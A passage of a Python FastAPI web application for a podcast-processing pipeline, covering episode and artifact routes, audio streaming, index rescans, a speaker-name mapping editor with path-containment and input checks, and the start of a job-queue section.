    async def api_episodes(request: Request, search: Optional[str] = Query(None)):
        """All episodes, optionally filtered by ``search``."""
        conn = _conn(request)
        term = (search or "").strip()
        episodes = db.list_episodes(conn, search=term or None)
        return {"count": len(episodes), "search": term or None, "episodes": episodes}

    @app.get("/api/episodes/{base_name}", name="api_episode")
    async def api_episode(request: Request, base_name: str):
        """One episode with all of its artifacts."""
        return _get_episode_or_404(request, base_name)

    @app.api_route(
        "/api/episodes/{base_name}/artifacts/{kind}",
        methods=["GET", "HEAD"],
        name="api_artifact",
    )
    async def api_artifact(
        request: Request,
        base_name: str,
        kind: str,
        fmt: Optional[str] = Query(None),
    ):
        """The content of one artifact.

        ``kind`` and ``fmt`` must be words from the scanner's vocabulary, so
        neither can carry a path fragment. The file that gets opened is the one
        the index recorded, re-verified against the podcast directory.
        """
        if kind not in ARTIFACT_KINDS:
            return _artifact_problem(request, "This is not an artifact kind this app knows.")
        # Per kind, not the global set: json is legal for speakers_map alone
        # (ADR-010), so kind=summary&fmt=json is rejected here rather than
        # passed through to miss in the index.
        if fmt is not None and fmt not in formats_for_kind(kind):
            return _artifact_problem(request, f"{kind} is never stored as {fmt}.")

        episode = _get_episode_or_404(request, base_name)
        artifact = _pick_artifact(episode, kind, fmt)
        if artifact is None:
            return _artifact_problem(
                request,
                f"There is no {kind} for {base_name} right now.\n\n"
                "If a job is running, this file may have been moved to the backup "
                "and not written again yet. The index also lags until the next "
                "rescan.",
            )

        path = _safe_file(request.app.state.podcast_dir, artifact.get("path"))
        if path is None:
            return _artifact_problem(
                request,
                f"The index lists a {kind} for {base_name}, but it is not on disk.\n\n"
                "A running job may have moved it aside. Rescan once the job has "
                "finished.",
            )

        media_type = _ARTIFACT_MEDIA_TYPES.get(
            artifact.get("fmt"), "text/plain; charset=utf-8"
        )
        # Served as bytes, never decoded: podcasts/ holds artifacts from years
        # of runs and a legacy cp1252 file would otherwise be a 500 instead of
        # a page. The browser applies the charset from the media type.
        return FileResponse(
            path,
            media_type=media_type,
            headers=_artifact_headers(request),
            content_disposition_type="inline",
            filename=os.path.basename(path),
        )

    @app.post("/api/rescan", name="api_rescan")
    async def api_rescan(request: Request):
        """Rebuild the index from the filesystem.

        The index is disposable by design (ADR-008): this reads ``podcasts/``
        again and replaces what it knows. It writes no episode artifacts.
        """
        conn = _conn(request)
        try:
            result = db.rescan(conn, request.app.state.podcast_dir)
        except WhycastError as exc:
            logger.warning("Rescan failed: %s", exc)
            raise HTTPException(status_code=500, detail=str(exc)) from None
        except OSError as exc:
            logger.warning("Rescan failed reading the podcast directory: %s", exc)
            raise HTTPException(
                status_code=500, detail="Could not read the podcast directory"
            ) from None
        return {"rescan": result, "meta": _public_meta(db.get_meta(conn))}

    # -- Media --------------------------------------------------------------

    @app.api_route("/media/{base_name}/audio", methods=["GET", "HEAD"], name="media_audio")
    async def media_audio(request: Request, base_name: str):
        """Stream an episode's audio.

        Returned as a :class:`FileResponse`, which answers ``Range`` requests
        with ``206 Partial Content``; that is what lets the browser's
        ``<audio>`` element seek instead of downloading an hour of mp3 first.

        HEAD is declared explicitly. Starlette's own ``Route`` adds it to any
        GET route, but FastAPI's ``@app.get`` does not - and an ``<audio>``
        element probes with HEAD before it streams, so leaving it off makes the
        player fail with a 405 on some browsers.
        """
        episode = _get_episode_or_404(request, base_name)
        path = _safe_file(request.app.state.podcast_dir, _audio_of(episode))
        if path is None:
            raise HTTPException(status_code=404, detail="Audio not available")

        ext = os.path.splitext(path)[1].lower()
        return FileResponse(
            path,
            media_type=_AUDIO_MEDIA_TYPES.get(ext, "application/octet-stream"),
            content_disposition_type="inline",
            filename=os.path.basename(path),
        )

    @app.get("/api/health", name="api_health")
    async def api_health(request: Request):
        """Liveness plus the allowlisted index statistics."""
        return {"status": "ok", "meta": _public_meta(db.get_meta(_conn(request)))}


# ---------------------------------------------------------------------------
# Speaker mapping editor (ADR-010, TASK-004)
#
# ``<base>_speakers.json`` is pipeline *input*: a person decides that
# SPEAKER_01 is Nancy, and :func:`whycast.pipeline.speakers.speaker_assignment_step`
# reads that decision instead of paying a reasoning model to guess it again.
# This is the page that lets them decide it without opening a JSON file in an
# editor, and the API behind it.
#
# Three rules shape everything below.
#
# * **Saving is free; applying is not.** Writing the mapping costs nothing and
#   needs no confirmation. Turning it into a rewritten transcript is the
#   ``speakers`` job, which calls the paid OpenAI API for the *other* steps and
#   is therefore enqueued through the same ``POST /api/jobs`` path, with the
#   same cost badge and the same confirmation, as every other paid action in
#   this UI. There is no route here that starts a job.
# * **The filesystem is the source of truth** (ADR-008). Everything this
#   section reports - does a mapping exist, is it stale, what does it say - is
#   read from disk at request time, never from the SQLite index. The index is a
#   cache that may lag by a rescan; the answer to "what will the next run do"
#   may not.
# * **Deleting is deliberate and singular.** A mapping is human work. Only
#   ``POST .../speakers/discard`` (and its ``DELETE`` twin) removes one, only
#   after a confirmation that names what is lost, and it removes exactly the
#   one file - the ``.bak`` beside it is left where it is.
#
#   This was an aspiration rather than a fact until the mapping was excluded
#   from :func:`whycast.pipeline.feed.delete_episode_files`. "Force reprocess"
#   took the mapping *and* its ``.bak`` in the same sweep, under a confirmation
#   dialog built from a job description that said "deletes this episode's
#   existing artifacts" - while the scanner's own taxonomy classifies the
#   mapping as INPUT, not artifact. Two copies of somebody's typing, gone on
#   one click, in a gitignored directory. It is a fact now, and
#   ``tests/test_speaker_mapping.py`` is what keeps it one.
#
# Path safety is the same contract as the rest of this module: ``base_name`` is
# an opaque key that has already been resolved through the index, and the file
# name it produces is re-checked against the podcast directory
# (:func:`_speaker_map_target`) before anything is written or removed.
# ---------------------------------------------------------------------------

#: A diarization label as it appears in a transcript. ``SPEAKER_00`` mostly,
#: but pyannote also emits ``SPEAKER_UNKNOWN``, so this is not ``\d+``.
_SPEAKER_LABEL_RE = re.compile(r"SPEAKER_[A-Za-z0-9_]+")

#: One transcript line that opens with a label, in either spelling the pipeline
#: has ever written: ``[SPEAKER_00] text`` (current) or ``SPEAKER_00: text``.
_SPEAKER_LINE_RE = re.compile(
    r"^\s*(?:\[(SPEAKER_[A-Za-z0-9_]+)\]|(SPEAKER_[A-Za-z0-9_]+)\s*:)\s*(.*)$"
)

#: Anything that cannot legitimately appear in a person's name and would only
#: ever be there to confuse a reader or a log: C0 controls plus DEL.
_CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f]")

#: The same idea for prompt text, minus the three controls that are ordinary
#: punctuation in prose: tab, newline and carriage return. Reusing
#: :data:`_CONTROL_CHARS` here would reject every multi-line prompt, which is
#: every prompt. The two human-input editors used to disagree about what "plain
#: text" means - the speaker editor refused a NUL byte in a name while the
#: prompt editor wrote one to a file that is then sent to the paid API - and
#: this is the pattern that settles the disagreement in the prompt's favour.
_PROMPT_CONTROL_CHARS = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")

#: How many lines of what a speaker actually said are shown per label. Enough
#: to recognise a voice - a greeting, a question, an answer - without turning
#: the editor into a transcript viewer.
SPEAKER_CONTEXT_LINES = 3

#: Longest context snippet, in characters. A merged transcript puts a whole
#: paragraph on one line; the first couple of sentences identify the speaker.
SPEAKER_CONTEXT_CHARS = 280

#: Longest name accepted for one label. Names are rendered on this page, in the
#: job log and in the assigned transcript; 120 characters is a generous human
#: name and a poor place to hide a payload.
MAX_SPEAKER_NAME_CHARS = 120

#: Most labels one transcript may contribute. A working diarization produces a
#: handful; hundreds mean a broken file, and rendering an input per label would
#: turn that into an unusable page.
MAX_SPEAKER_LABELS = 200

#: Prefix for the form fields that carry names, so a ``<form>`` post and a JSON
#: post validate identically: every ``speaker:<LABEL>`` field is a mapping
#: entry - including a bogus one, which is then rejected rather than ignored -
#: and every other field is form furniture this route does not read.
SPEAKER_FORM_PREFIX = "speaker:"

#: The job type that applies a saved mapping to the transcript. Named here so
#: the page can offer it, but enqueued through ``POST /api/jobs`` like anything
#: else: the cost flag comes from :data:`webui.jobs.JOB_TYPES`, never from here.
SPEAKER_APPLY_JOB = "speakers"


def _speakers_module():
    """Import :mod:`whycast.pipeline.speakers`, or raise 503.

    Imported lazily, per request, for two reasons. It pulls in the OpenAI SDK
    (about two seconds on this machine), which the read-only half of the UI has
    no use for and should not pay for at startup; and if that dependency is
    missing, the episode browser and the job queue must keep working. The
    module itself makes no network call and holds no GPU - it is imported here
    only for the mapping file's format, path and fingerprint.
    """
    try:
        from whycast.pipeline import speakers as speakers_module
    except Exception as exc:  # ImportError, but a bad dependency can raise more
        logger.error("The speaker mapping helpers could not be imported: %s", exc)
        raise HTTPException(
            status_code=503,
            detail=(
                "The speaker mapping code is not importable in this "
                "environment, so mappings cannot be read or written here."
            ),
        ) from None
    return speakers_module


def _speaker_map_target(request: Request, episode: Dict[str, Any]) -> str:
    """Where this episode's mapping file lives, verified to be inside ``podcasts/``.

    The same reasoning as :func:`_safe_file`, for a path that may not exist yet:
    that function insists on a regular file, which a file about to be *created*
    is not. So the containment check is done here instead, and it is stricter
    than a prefix test - the mapping must be a direct child of the podcast
    directory (the scanner is shallow, so every episode file is) and must be
    named exactly ``<base_name>_speakers.json``.

    ``base_name`` is the index's own spelling, produced by the scanner from a
    real directory entry, so it cannot contain a separator. This check is what
    makes that a guarantee rather than an assumption.
    """
    root = request.app.state.podcast_dir
    base = episode["base_name"]
    expected = f"{base}{SPEAKER_MAP_SUFFIX}"
    candidate = os.path.join(root, expected)
    try:
        resolved = os.path.realpath(candidate)
        real_root = os.path.realpath(root)
    except (OSError, ValueError):
        raise HTTPException(
            status_code=404, detail="The podcast directory is not readable"
        ) from None

    # normpath on both sides before comparing: it is the one spelling that also
    # holds when the podcast directory *is* a drive root, where "D:\" has a
    # trailing separator that no amount of rstrip makes match a dirname.
    same_dir = os.path.normcase(
        os.path.normpath(os.path.dirname(resolved))
    ) == os.path.normcase(os.path.normpath(real_root))
    same_name = os.path.normcase(os.path.basename(resolved)) == os.path.normcase(
        expected
    )
    if not (same_dir and same_name):
        logger.warning(
            "Refusing a speaker mapping path for %r: %r is not %s/%s",
            base,
            resolved,
            real_root,
            expected,
        )
        raise HTTPException(
            status_code=400, detail="That episode name cannot hold a speaker mapping"
        )
    return resolved


def _speaker_map_summary(request: Request, episode: Dict[str, Any]) -> Dict[str, Any]:
    """Does this episode have a saved mapping? One stat, straight from disk.

    Used by the episode page for its at-a-glance line. Read from the filesystem
    rather than from ``episode.formats``, because the index can be a rescan
    behind and "will the next run use my names" is exactly the question that
    must not be answered from a cache. One ``os.path.isfile`` on a local path
    costs less than the template line that renders it.
    """
    try:
        path = _speaker_map_target(request, episode)
    except HTTPException:
        return {"file": None, "exists": False}
    return {"file": os.path.basename(path), "exists": os.path.isfile(path)}


def _transcript_artifact(episode: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """The transcript a speakers re-run would start from, or None.

    Deliberately identical to :func:`webui.runner._read_transcript`: ``merged``
    before ``transcript``, ordered by format preference, stable within a kind
    because the index returns artifacts in scan order and :func:`sorted` keeps
    it. It has to be identical, because the fingerprint this editor records is
    the hash of *this* file and the runner will compare it against the hash of
    whatever it picks. Choose a different file here and every saved mapping
    would read as stale the moment it was applied.
    """
    artifacts = _artifacts_of(episode)
    for kind in ("merged", "transcript"):
        matches = sorted(
            (a for a in artifacts if a.get("kind") == kind),
            key=lambda a: _FMT_ORDER.get(a.get("fmt"), len(_FMT_ORDER)),
        )
        if matches:
            return matches[0]
    return None


def _labels_with_context(text: str) -> Tuple[List[Dict[str, Any]], bool]:
    """Every ``SPEAKER_xx`` label in ``text``, in order, with a few of its lines.

    Returns ``(labels, truncated)``. ``truncated`` is True when
    :data:`MAX_SPEAKER_LABELS` was reached and labels past it were left out - a
    cap that drops work silently is the wrong kind of cap, and a label that is
    not on this page cannot be named at all.

    The context is the point of this page: ``SPEAKER_03`` means nothing, while
    "So Ad, what are we talking about today?" tells you who is speaking without
    opening the transcript.

    Two passes on purpose. The first reads lines that *open* with a label and
    keeps what was said; the second sweeps the whole text for labels that never
    start a line (a mid-line tag, a label only mentioned in passing) so the list
    is complete even where there is nothing to quote. Completeness matters more
    than tidiness here: a label missing from this list cannot be given a name,
    and would silently survive into the assigned transcript.
    """
    turns: Dict[str, int] = {}
    context: Dict[str, List[str]] = {}
    order: List[str] = []
    truncated = False

    def remember(label: str) -> bool:
        nonlocal truncated
        if label in turns:
            return True
        if len(order) >= MAX_SPEAKER_LABELS:
            truncated = True
            return False
        order.append(label)
        turns[label] = 0
        context[label] = []
        return True

    for line in text.splitlines():
        match = _SPEAKER_LINE_RE.match(line)
        if not match:
            continue
        label = match.group(1) or match.group(2)
        if not remember(label):
            continue
        turns[label] += 1
        said = (match.group(3) or "").strip()
        if said and len(context[label]) < SPEAKER_CONTEXT_LINES:
            if len(said) > SPEAKER_CONTEXT_CHARS:
                said = said[:SPEAKER_CONTEXT_CHARS].rstrip() + "…"
            context[label].append(said)

    for label in _SPEAKER_LABEL_RE.findall(text):
        remember(label)

    labels = [
        {"label": label, "turns": turns[label], "context": context[label]}
        for label in order
    ]
    return labels, truncated


def _read_transcript_text(path: str) -> Tuple[Optional[str], Optional[str]]:
    """Read a transcript exactly as the runner does. Returns ``(text, error)``.

    ``encoding="utf-8"`` with no ``errors=`` policy, matching
    :func:`webui.runner._read_transcript` byte for byte. Being forgiving here
    would be worse than useless: replacing an undecodable byte would change the
    text, change its fingerprint, and record a mapping against a transcript
    that does not exist. A file the runner cannot read is reported, not
    patched.
    """
    try:
        with open(path, "r", encoding="utf-8") as handle:
            return handle.read(), None
    except UnicodeDecodeError as exc:
        return None, (
            f"{os.path.basename(path)} is not valid UTF-8 ({exc}). The pipeline "
            f"writes UTF-8, so this file was written by something else - a "
            f"speakers run would fail on it too."
        )
    except OSError as exc:
        return None, f"{os.path.basename(path)} could not be read: {exc}"


def _speaker_state(request: Request, episode: Dict[str, Any]) -> Dict[str, Any]:
    """Everything the editor and its API need, read from disk. Blocking.

    Called through ``anyio.to_thread.run_sync``: it opens the transcript, which
    is a megabyte of text on a long episode, and this app shares one event loop
    with an open SSE job log.

    The mapping is loaded **without** a fingerprint on purpose. Passing one
    makes :func:`load_speaker_map_record` raise on a stale file, which is right
    for the pipeline (do not apply names that were chosen for another
    transcript) and exactly wrong for an editor whose job in that case is to
    *show* those names so a person can check them. So: load it, then ask
    :func:`mapping_is_stale` separately, and let the page say so.

    ``next_run`` is the one field the page leads with. It answers "what happens
    if I queue a speakers job right now", and it is the ADR-010 precedence
    order spelled out for a reader:

    ``saved``      the mapping applies; no model call, nothing to pay;
    ``model``      no mapping, so the model decides and the answer is saved;
    ``stale``      the mapping was made for a different transcript - the run
                   fails until a person confirms or discards it;
    ``malformed``  the file cannot be parsed - the run fails, loudly, rather
                   than quietly paying a model to replace somebody's typing;
    ``no_labels``  the transcript carries no ``SPEAKER_`` labels, so the step
                   has nothing to do;
    ``no_transcript`` there is no transcript on disk yet.
    """
    speakers_module = _speakers_module()
    root = request.app.state.podcast_dir
    base = episode["base_name"]
    path = _speaker_map_target(request, episode)

    state: Dict[str, Any] = {
        "base_name": base,
        "map_file": os.path.basename(path),
        "map_path": path,
        "exists": os.path.isfile(path),
        "backup_file": None,
        "speakers": {},
        "source": None,
        "updated_at": None,
        "saved_fingerprint": None,
        "mapping_error": None,
        "transcript_file": None,
        "transcript_kind": None,
        "transcript_error": None,
        "fingerprint": None,
        "labels": [],
        "labels_truncated": False,
        "orphans": [],
        "stale": False,
        "next_run": "no_transcript",
    }

    backup = path + ".bak"
    if os.path.isfile(backup):
        state["backup_file"] = os.path.basename(backup)

    record = None
    if state["exists"]:
        try:
            record = speakers_module.load_speaker_map_record(base, root)
        except WhycastError as exc:
            # A malformed file. Reported as text, never repaired: the point of
            # ADR-010 is that a typo stays visible.
            state["mapping_error"] = str(exc)
        except OSError as exc:  # pragma: no cover - defensive
            state["mapping_error"] = f"{state['map_file']} could not be read: {exc}"

    if record:
        state["speakers"] = dict(record.get("speakers") or {})
        state["source"] = record.get("source")
        state["updated_at"] = record.get("updated_at")
        state["saved_fingerprint"] = record.get("transcript_fingerprint")

    artifact = _transcript_artifact(episode)
    if artifact is not None:
        transcript_path = _safe_file(root, artifact.get("path"))
        if transcript_path is None:
            state["transcript_error"] = (
                "The transcript the index recorded is not where it says it is. "
                "Rescan the podcast directory and try again."
            )
        else:
            state["transcript_file"] = os.path.basename(transcript_path)
            state["transcript_kind"] = artifact.get("kind")
            text, error = _read_transcript_text(transcript_path)
            if error:
                state["transcript_error"] = error
            else:
                state["fingerprint"] = speakers_module.fingerprint_transcript(text)
                state["labels"], state["labels_truncated"] = _labels_with_context(text)

    if record and state["fingerprint"]:
        state["stale"] = bool(
            speakers_module.mapping_is_stale(record, state["fingerprint"])
        )

    known = {item["label"] for item in state["labels"]}
    for item in state["labels"]:
        item["name"] = state["speakers"].get(item["label"], "")
    state["orphans"] = [
        {"label": label, "name": name}
        for label, name in sorted(state["speakers"].items())
        if label not in known
    ]

    if state["mapping_error"]:
        state["next_run"] = "malformed"
    elif state["transcript_error"] or state["transcript_file"] is None:
        state["next_run"] = "no_transcript"
    elif state["stale"]:
        state["next_run"] = "stale"
    elif not known:
        state["next_run"] = "no_labels"
    elif record:
        state["next_run"] = "saved"
    else:
        state["next_run"] = "model"
    return state


def _public_speaker_state(state: Dict[str, Any]) -> Dict[str, Any]:
    """The API view of :func:`_speaker_state`: no absolute paths.

    ``map_path`` is an absolute path on the operator's disk. It is useful on
    the page (it is the file you would open in an editor) and pointless in a
    JSON response, so the API reports the file *name* and nothing more - the
    same instinct as :data:`META_KEYS`.
    """
    return {key: value for key, value in state.items() if key != "map_path"}


def _speaker_apply_job() -> Optional[Dict[str, Any]]:
    """The catalogue entry for the job that applies a mapping, or None.

    Read from :func:`job_types_payload` rather than written out here, so the
    cost badge this page shows is the flag the enqueue route validates against.
    """
    for spec in job_types_payload():
        if spec["type"] == SPEAKER_APPLY_JOB:
            return spec
    return None


async def _speaker_payload(request: Request) -> Dict[str, Any]:
    """Read ``{label: name}`` from a JSON or form-encoded body.

    JSON: ``{"speakers": {"SPEAKER_00": "Nancy"}}``. A bare ``{"SPEAKER_00":
    "Nancy"}`` is accepted too - it is what the file itself may look like, so
    refusing it here would be a gratuitous difference.

    Form: one ``speaker:<LABEL>`` field per label (:data:`SPEAKER_FORM_PREFIX`),
    which is what the page posts with and without JavaScript. Fields without
    that prefix are form furniture and are ignored; a *prefixed* field naming a
    label the transcript does not have is rejected, not dropped, so both body
    shapes fail the same way on the same input.
    """
    body = await _read_capped_body(
        request, MAX_JOB_BODY_BYTES, _SPEAKER_BODY_TOO_LARGE
    )
    if _is_form_request(request):
        return {
            key[len(SPEAKER_FORM_PREFIX):]: value
            for key, value in _form_fields(body).items()
            if key.startswith(SPEAKER_FORM_PREFIX)
        }

    if not body.strip():
        raise HTTPException(
            status_code=400,
            detail='Body must be JSON: {"speakers": {"SPEAKER_00": "Nancy"}}',
        )
    try:
        payload = json.loads(body)
    except ValueError:
        raise HTTPException(
            status_code=400,
            detail='Body must be JSON: {"speakers": {"SPEAKER_00": "Nancy"}}',
        ) from None
    if not isinstance(payload, dict):
        raise HTTPException(
            status_code=400, detail="Body must be a JSON object, not a list or scalar"
        )
    if "speakers" in payload:
        speakers = payload["speakers"]
        if not isinstance(speakers, dict):
            raise HTTPException(
                status_code=400, detail='"speakers" must be an object of label: name'
            )
        return dict(speakers)
    return payload


def _validated_speaker_mapping(
    payload: Dict[str, Any], state: Dict[str, Any]
) -> Dict[str, str]:
    """Turn a request body into a mapping worth writing, or raise 400.

    Every label must be one the transcript actually contains. That is the whole
    check: a mapping is applied by literal string replacement (ADR-004), so a
    label that is not in the text does nothing at all, and accepting it would
    quietly store a correction that can never take effect. It also means this
    route cannot be used to write arbitrary keys into a file on disk.

    A blank name is "leave this one as it is", not an error - it is how you back
    out of a name you were unsure about. An entirely blank form is refused, with
    the pointer to the one action that does mean "there should be no mapping".
    """
    known = {item["label"] for item in state["labels"]}
    if not known:
        raise HTTPException(
            status_code=409,
            detail=(
                "This transcript carries no SPEAKER_ labels, so there is "
                "nothing to name."
            ),
        )

    cleaned: Dict[str, str] = {}
    for raw_label, raw_name in payload.items():
        label = str(raw_label).strip()
        if label.startswith("[") and label.endswith("]"):
            label = label[1:-1].strip()
        if label not in known:
            raise HTTPException(
                status_code=400,
                detail=(
                    f"{label!r} is not a speaker label in "
                    f"{state['transcript_file'] or 'this transcript'}. Labels "
                    f"here: " + ", ".join(sorted(known))
                ),
            )
        if not isinstance(raw_name, str):
            raise HTTPException(
                status_code=400,
                detail=f"The name for {label} must be text, not "
                f"{type(raw_name).__name__}",
            )
        name = raw_name.strip()
        if not name:
            continue
        if len(name) > MAX_SPEAKER_NAME_CHARS:
            raise HTTPException(
                status_code=400,
                detail=(
                    f"The name for {label} is {len(name)} characters; "
                    f"{MAX_SPEAKER_NAME_CHARS} is the limit."
                ),
            )
        if _CONTROL_CHARS.search(name):
            raise HTTPException(
                status_code=400,
                detail=(
                    f"The name for {label} contains a control character. Names "
                    f"are plain text."
                ),
            )
        cleaned[label] = name

    if not cleaned:
        raise HTTPException(
            status_code=400,
            detail=(
                "No names were given, so there is nothing to save. To remove "
                "the saved mapping and let the model decide again, use "
                "discard."
            ),
        )
    return cleaned


def _write_speaker_mapping(
    request: Request,
    episode: Dict[str, Any],
    mapping: Dict[str, str],
    fingerprint: Optional[str],
) -> str:
    """Write the mapping with ``source="human"``. Blocking; run it in a thread.

    ``backup=True`` is :func:`save_speaker_mapping`'s own doing and is the
    ADR-009 exception that proves the rule: generated artifacts keep no ``.bak``
    because the pipeline can make them again, and this file cannot be made again
    by anything but a person.

    The fingerprint of the transcript on screen is recorded with the names. It
    is what lets a later re-transcription be recognised as having moved the
    ground under them - and it is why "check the names and save again" is all it
    takes to clear a stale mapping.
    """
    speakers_module = _speakers_module()
    root = request.app.state.podcast_dir
    base = episode["base_name"]
    target = _speaker_map_target(request, episode)
    # The writer builds its own path from (base, dir). Confirm it is the one
    # this route just vetted, rather than assuming two spellings of the same
    # join can never drift.
    computed = os.path.realpath(speakers_module.speaker_map_path(base, root))
    if os.path.normcase(computed) != os.path.normcase(target):
        logger.error(
            "Speaker mapping path mismatch: vetted %r, writer would use %r",
            target,
            computed,
        )
        raise HTTPException(
            status_code=500,
            detail="Refusing to write the speaker mapping: the path does not check out",
        )
    return speakers_module.save_speaker_mapping(
        mapping,
        base,
        root,
        transcript_fingerprint=fingerprint,
        source="human",
    )


def _refresh_index(request: Request) -> None:
    """Re-read ``podcasts/`` after a mapping changed. Blocking, best effort.

    The index is a rebuildable cache (ADR-008), and it has just gone one file
    out of date: the overview matrix and the episode's file table would keep
    showing the old answer until something else triggered a scan. A failure here
    is not the caller's problem - the file was written, and that is the part
    that matters - so it is logged and swallowed.
    """
    try:
        db.rescan(request.app.state.conn, request.app.state.podcast_dir)
    except (WhycastError, OSError, sqlite3.Error) as exc:
        logger.warning("Could not refresh the index after a mapping change: %s", exc)


def _register_speaker_routes(app: FastAPI, templates: Jinja2Templates) -> None:
    """The speaker mapping editor: one page and three API routes."""

    @app.get(
        "/episodes/{base_name}/speakers",
        response_class=HTMLResponse,
        name="speaker_editor",
    )
    async def speaker_editor(request: Request, base_name: str):
        """Name every speaker in one episode.

        Uses :func:`_conn`, not :func:`_queue_or_503`: reading and correcting
        names is free, needs no worker, and must keep working when the queue is
        down. The offer to apply them is what needs the queue, and it is
        wrapped separately - same reasoning as the episode page.
        """
        conn = _conn(request)
        episode = _get_episode_or_404(request, base_name)
        state = await anyio.to_thread.run_sync(_speaker_state, request, episode)
        try:
            active = jobs.active_job(conn)
            episode_jobs = _episode_jobs(conn, episode["base_name"])
            apply_job = _speaker_apply_job()
        except sqlite3.Error as exc:
            logger.warning("Job queue unreadable on the speaker editor: %s", exc)
            active, episode_jobs, apply_job = None, [], None
        return templates.TemplateResponse(
            request,
            "speakers.html",
            {
                "episode": episode,
                "state": state,
                "apply_job": apply_job,
                "active_job": active,
                "episode_jobs": episode_jobs,
                "meta": _public_meta(db.get_meta(conn)),
            },
        )

    @app.get("/api/episodes/{base_name}/speakers", name="api_speakers")
    async def api_speakers(request: Request, base_name: str):
        """What the next speakers run will do, and the names it would use."""
        _conn(request)
        episode = _get_episode_or_404(request, base_name)
        state = await anyio.to_thread.run_sync(_speaker_state, request, episode)
        return _public_speaker_state(state)

    @app.post("/api/episodes/{base_name}/speakers", name="api_speakers_save")
    async def api_speakers_save(request: Request, base_name: str):
        """Save the mapping for one episode as human input. Costs nothing.

        Writes the file and stops. Applying it to the transcript is the
        ``speakers`` job, which spends money; the response carries that job's
        catalogue entry - cost flag and all - so the page can offer it, and the
        caller still has to ask for it by name at ``POST /api/jobs``.
        """
        _conn(request)
        episode = _get_episode_or_404(request, base_name)
        payload = await _speaker_payload(request)
        state = await anyio.to_thread.run_sync(_speaker_state, request, episode)

        if state["transcript_error"]:
            raise HTTPException(status_code=409, detail=state["transcript_error"])
        if state["transcript_file"] is None:
            raise HTTPException(
                status_code=409,
                detail=(
                    f"{episode['base_name']} has no transcript on disk, so there "
                    f"are no speaker labels to name. Run the pipeline first."
                ),
            )

        mapping = _validated_speaker_mapping(payload, state)
        dropped = sorted(set(state["speakers"]) - set(mapping))
        try:
            path = await anyio.to_thread.run_sync(
                _write_speaker_mapping,
                request,
                episode,
                mapping,
                state["fingerprint"],
            )
        except WhycastError as exc:
            # The writer's own validation (an empty or non-string mapping).
            # Everything it checks is checked above, so this is defence in
            # depth rather than a path a request can reach.
            raise HTTPException(status_code=400, detail=str(exc)) from None
        except OSError as exc:
            logger.error("Could not write the speaker mapping for %s: %s", base_name, exc)
            raise HTTPException(
                status_code=500,
                detail=f"The speaker mapping could not be written: {exc}",
            ) from None

        await anyio.to_thread.run_sync(_refresh_index, request)
        backup = path + ".bak"
        logger.info(
            "Saved speaker mapping for %s (%d names, source=human)",
            episode["base_name"],
            len(mapping),
        )
        return {
            "saved": True,
            "base_name": episode["base_name"],
            "file": os.path.basename(path),
            "speakers": mapping,
            "source": "human",
            "transcript_file": state["transcript_file"],
            "dropped": dropped,
            "backup_file": os.path.basename(backup)
            if os.path.isfile(backup)
            else None,
            "next_run": "saved",
            "apply_job": _speaker_apply_job(),
        }

    async def _discard(request: Request, base_name: str) -> Dict[str, Any]:
        """Remove the saved mapping. The only route that deletes one."""
        _conn(request)
        episode = _get_episode_or_404(request, base_name)
        path = _speaker_map_target(request, episode)
        backup = path + ".bak"
        existed = os.path.isfile(path)
        if existed:
            try:
                await anyio.to_thread.run_sync(os.remove, path)
            except OSError as exc:
                logger.error("Could not discard the speaker mapping %s: %s", path, exc)
                raise HTTPException(
                    status_code=500,
                    detail=f"The speaker mapping could not be removed: {exc}",
                ) from None
            logger.info(
                "Discarded the speaker mapping for %s at the operator's request",
                episode["base_name"],
            )
            await anyio.to_thread.run_sync(_refresh_index, request)
        # The .bak is deliberately left alone. Discard means "let the model
        # decide again", not "destroy what was typed" (ADR-010: human work is
        # not deleted by anything but a person's explicit instruction, and this
        # instruction named the mapping, not its backup).
        #
        # What it is NOT is an undo of this discard, and the field name alone
        # invites exactly that reading. The backup holds the version *before*
        # the one just discarded: after a single save there is no .bak at all
        # and nothing is recoverable; after two saves it holds v1 while v2 is
        # the one that just went. It is also not refreshed by a later save,
        # because io_utils._stage_backup returns None when the target is
        # absent - so it can outlive the mapping it belonged to and go on being
        # reported as "the previous version" of a mapping typed weeks later.
        # So it is reported under a name that says what it is, and described.
        backup_name = os.path.basename(backup) if os.path.isfile(backup) else None
        return {
            "discarded": existed,
            "base_name": episode["base_name"],
            "file": os.path.basename(path),
            "backup_file": backup_name,
            "backup_is_older_version": bool(backup_name),
            "next_run": "model",
            "detail": (
                "The saved mapping is gone. The next speakers run asks the "
                "model, which costs money, and saves what it decides."
                + (
                    f" {backup_name} is left in place, but it holds the version "
                    f"before the one you just discarded, not that one - it is "
                    f"not an undo of this."
                    if backup_name
                    else " There was no backup, so the discarded names are not "
                    "recoverable from here."
                )
                if existed
                else "There was no saved mapping to discard; nothing changed."
            ),
        }

    @app.post("/api/episodes/{base_name}/speakers/discard", name="api_speakers_discard")
    async def api_speakers_discard(request: Request, base_name: str):
        """Discard the saved mapping (the form path: a POST works without JS)."""
        return await _discard(request, base_name)

    @app.delete("/api/episodes/{base_name}/speakers", name="api_speakers_delete")
    async def api_speakers_delete(request: Request, base_name: str):
        """Discard the saved mapping (the REST spelling of the same action)."""
        return await _discard(request, base_name)


# ---------------------------------------------------------------------------
# Job queue (ADR-008 phase 2)
#
# This app *enqueues* work; it never runs it. A job row goes into SQLite, a
# separate worker process claims it (strictly one at a time) and spawns
# ``python -m webui.runner <id>`` as a child. Nothing here imports the
# pipeline, spawns a process, or writes an episode artifact - a CUDA
# out-of-memory kill must take down a child, not the web server.
#
# Two rules are load-bearing and are enforced in one place each:
#
# * ``type`` must be a key of :data:`webui.jobs.JOB_TYPES`
#   (:func:`_validated_job_request`). Anything else is a 400, so no request can
#   name a job the runner does not have a branch for.
# * ``base_name`` must resolve through the episode index before it is stored.
#   It is an opaque lookup key here exactly as it is everywhere else in this
#   module: the runner turns it back into a path by asking the index, never by
#   joining it onto a directory. Same reasoning as ``_safe_file``.
#
# ``params`` is passed through to the runner as JSON arguments and is never
# used to build a path (ADR-008). The one thing it must not become is a way to
# start a paid job by accident, which is why cost is a property of the *type*,
# reported on every job and job-type response, and never inferred from params.
# ---------------------------------------------------------------------------


def job_types_payload() -> List[Dict[str, Any]]:
    """The job catalogue, as the API and the templates see it.

    ``cost`` is the flag the UI must warn on before enqueueing: it means the
    job makes paid OpenAI calls (ADR-003). ``gpu`` means it claims the single
    CUDA device. Both are properties of the type, so a caller can never talk
